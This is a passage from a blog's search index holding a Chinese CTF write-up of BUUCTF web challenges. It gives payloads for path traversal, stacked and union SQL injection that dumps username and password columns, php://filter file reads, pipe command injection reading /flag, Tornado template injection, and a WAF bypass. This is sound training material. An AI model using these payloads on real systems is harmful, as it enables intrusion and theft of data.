<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF寒假刷题-Web</title>
      <link href="2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/"/>
      <url>2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>寒假横向刷题（尽量）</p><h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021.01.15"></a>2021.01.15</h1><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>进到靶机一个硕大的滑稽，查看源码有提示source.php</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现白名单有source.php和hint.php，先去查看一下hint.php</p><blockquote><p>flag not here, and flag in ffffllllaaaagggg</p></blockquote><p>分析源码</p><ul><li>判断<code>$_REQUEST[&#39;file&#39;]</code>对象为空且为字符串</li><li>执行emmm类中的<strong>checkFile</strong>方法判断是否在白名单（确保函数返回是true）</li><li>文件包含</li></ul><p>checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。</p><ol><li>第一种</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>字符串截取将原字符串尾部加上<code>?</code>再截取第一个<code>?</code>之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的<code>../</code>返回上级目录。</p><ol start="2"><li>第二种</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>将第一种payload使用urlencode编码即可。</p><hr><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png"></p><p>根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>这道题使用的是堆叠注入，原理</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png"></p><p>查看当前库下的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png"></p><p>查看两张表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from words;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png"></p><p>还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png"></p><p>找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是<strong>word</strong>表中的字段，而flag在<strong>1919810931114514</strong>表中。</p><p>网上找到的两种方法，分别是修改表名和使用预处理语句。</p><ol><li>使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">预处理</a>语句</li></ol><p>因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(115,101,108,101,99,116)</span><br></pre></td></tr></table></figure><p>根据预处理语句格式构造payload</p><ul><li>创建一个<strong>sqli</strong>字符串值为查询sql语句，使用预处理语句赋值并执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure><ul><li>不使用变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;PREPARE sqli FROM CONCAT(&#39;s&#39;,&#39;elect&#39;,&#39; * from &#96;1919810931114514&#96;&#39;);EXECUTE sqli; #</span><br></pre></td></tr></table></figure><ul><li>还有一种</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SET @sqli &#x3D; CONCAT(&#39;s&#39;,&#39;e&#39;,&#39;l&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; * from &#96;1919810931114514&#96;&#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #</span><br></pre></td></tr></table></figure><p>主要区别在于过滤的绕过方式，不要拘泥于一种方式。</p><ol start="2"><li>修改表名</li></ol><p>修改表名的思路是：默认查询的是<strong>word</strong>表第一个字段，所以把<strong>word</strong>表修改为其他名称，将flag所在的<strong>1919810931114514</strong>表名修改为<strong>word</strong>。</p><p>网上payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure><p>自己构造的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) #</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure><p>查询表所有字段值即可。</p><hr><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png"></p><p>用户名密码，尝试万能密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">随便密码</span><br></pre></td></tr></table></figure><p>一个万能密码的参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pass-A/p/11134988.html">https://www.cnblogs.com/pass-A/p/11134988.html</a></p><hr><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png"></p><p>直接源码找到php代码。payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cat&#x3D;dog</span><br></pre></td></tr></table></figure><hr><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png"></p><p>单引号无报错，尝试堆叠注入可以回显。</p><p>和 [强网杯 2019]随便注这道题一样查库查表查字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1;show tables;</span><br></pre></td></tr></table></figure><p>但是执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;desc &#96;Flag&#96;;</span><br><span class="line">1;show columns from Flag;</span><br></pre></td></tr></table></figure><p>返回了”Nonono.“测试出被过滤了：desc、from、Flag。</p><p>接下来的都是抄网上的预期解也是第一次见。</p><p>比赛时源码泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure><blockquote><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能</p></blockquote><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1 </span><br></pre></td></tr></table></figure><hr><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>不截图了，进入靶机只有一个<strong>tips</strong>等着被点。跳转以后看url中参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>页面内容只有</p><blockquote><p>Can you find out the flag?</p></blockquote><p>立马想到使用php伪协议读文件内容。使用filter过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo&#x3D;</span><br></pre></td></tr></table></figure><p>解密得到flag</p><hr><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png"></p><p>查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png"></p><p>查看源码SECRET跳转的是action.php。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png"></p><p>但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png"></p><p>stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。</p><p>同样使用php伪协议filter过滤器读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;</span><br></pre></td></tr></table></figure><p>解密得到网页源码，flag在其中。</p><hr><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>顶端の告诫：用 sqlmap 是没有灵魂的</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png"></p><p>尝试万能密码（其实没卵用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">任意密码</span><br></pre></td></tr></table></figure><p>这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳</p><p>字段数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3 #</span><br></pre></td></tr></table></figure><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line">geekuser,l0ve1ysq1</span><br></pre></td></tr></table></figure><p>爆字段值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39; #</span><br><span class="line"></span><br><span class="line">id,username,password</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class="line"></span><br><span class="line">&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;c4e8849c-e0e3-4e0d-b701-26a5abeec46a&#125;&#39;</span><br></pre></td></tr></table></figure><hr><h1 id="2021-01-21"><a href="#2021-01-21" class="headerlink" title="2021.01.21"></a>2021.01.21</h1><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><a href="https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/">传送门</a></p><hr><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png"></p><p>肯定是尝试管道符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat &#x2F;flag</span><br></pre></td></tr></table></figure><hr><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开页面三个超链接</p><blockquote><p>/flag.txt</p><p>/welcome.txt</p><p>hints.txt</p></blockquote><p>内容分别是</p><blockquote><p>flag in /fllllllllllllag</p><p>render</p><p>md5(cookie_secret+md5(filename))</p></blockquote><p>进入hints.txt注意到url地址此时为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure><p>再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供<strong>filehash</strong>值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称<code>filename</code>有了，接下来就是获取<code>cookie_secret</code>的值。</p><p>接下来触及到盲区了，获取cookie_secret是看wp。</p><blockquote><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p></blockquote><blockquote><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p></blockquote><p>获取cookie_secret的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png"></p><p>获得cookie_secret的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eb326d39-cd67-47bd-b2d3-71125996417b</span><br></pre></td></tr></table></figure><p>根据hints.txt的url验证一下是如何加密的。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png"></p><p>选中的蓝色部分是<code>/hints.txt</code>加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure><hr><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png"></p><p>一句话直接连。</p><hr><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png"></p><p>一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：<strong>calc.php</strong>，但是也有一句很重要的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png"></p><p>php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为<strong>WAF</strong>，接下来是参考网上的wp自己的理解</p><p>可以在calc.php传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;a</span><br></pre></td></tr></table></figure><p>php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格’ ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。</p><p>接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()</p><p>查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——&gt;   ‘/‘  ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><hr><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png"></p><p>查看源码在”氛围”这两个字上有隐藏的跳转Secret.php。进入以后页面显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#39;t come from &#39;https:&#x2F;&#x2F;www.Sycsecret.com&#39;</span><br></pre></td></tr></table></figure><p>提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure><p>加上User-Agent。提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure><p>加上X-Forwarded-For。<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html">HTTP X-Forwarded-For 介绍</a></p><p>最终的请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:26715</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><hr><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img 